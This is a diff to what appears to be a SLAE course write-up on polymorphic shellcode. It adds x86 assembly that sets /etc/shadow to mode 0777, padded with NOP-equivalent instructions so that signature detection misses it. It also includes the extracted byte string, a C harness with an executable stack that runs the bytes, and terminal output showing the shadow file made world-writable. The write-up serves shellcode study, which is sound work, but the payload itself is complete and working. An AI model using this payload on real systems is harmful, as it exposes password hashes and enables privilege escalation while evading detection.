@@ -138,8 +138,84 @@ int    0x80
 There aren't many things that we can do. Nonetheless, we can apply similar techniques as we did on the previous shellcode:
 
 ```term
+; Original Shellcode: http://shell-storm.org/shellcode/files/shellcode-590.php
 
+global _start
+
+_start:
+
+       dec ebp            ; NOP Equivalent.
+
+       xor eax, eax       ; Zeroes out EAX.
+       cdq                ; Zeroes out EDX.
+       push edx           ; Pushes the dword of EDX (0x00000000).
+       mov al, 0xf        ; Moves value of syscall chmod into AL.
+
+       sahf               ; NOP Equivalent.
+       push 0x776f6461    ; woda
+
+       cld                ; NOP Equivalent.
+       push 0x68732f63    ; hs/c
+
+       push 0x74652f2f    ; te//
+       cdq                ; NOP Equivalent.
+
+       mov ebx, esp       ; Copies value from ESP to EBX.
+       pushfd             ; NOP Equivalent.
+       mov cx, 0x1ff      ; Value that means in octal "0777".
+       cmc                ; NOP Equivalent.
+       int  0x80          ; Call to kernel.
+
+       inc eax            ; Increment EAX to 1, value for syscall exit().
+       pushad             ; NOP Equivalent.
+       int 0x80           ; Call to kernel.
 ```
+
+Let's obtain the dump the shellcode and test it!
+
+```term
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x4d\x31\xc0\x99\x52\xb0\x0f\x9e\x68\x61\x64\x6f\x77\xfc\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x99\x89\xe3\x9c\x66\xb9\xff\x01\xf5\xcd\x80\x40\x60\xcd\x80"
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode#
+```
+
+```term
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = \
+"\x4d\x31\xc0\x99\x52\xb0\x0f\x9e\x68\x61\x64\x6f\x77\xfc\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x99\x89\xe3\x9c\x66\xb9\xff\x01\xf5\xcd\x80\x40\x60\xcd\x80";
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+```
+
+#### EndGame #2
+
+```term
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# gcc polymorphic.c -o polymorphic -fno-stack-protector -z execstack -w 
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow
+-rw-r--r-- 1 511 12079 1115 Dec 28 10:33 /etc/shadow
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ./polymorphic 
+Shellcode Length:  39
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# ls -la /etc/shadow 
+-rwxrwxrwx 1 511 12079 1115 Dec 28 10:33 /etc/shadow
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# 
+```
+
+Original Size: 33 bytes
+Final Size: 39 bytes
+
+Increment: 19%
 
 ### Code
 
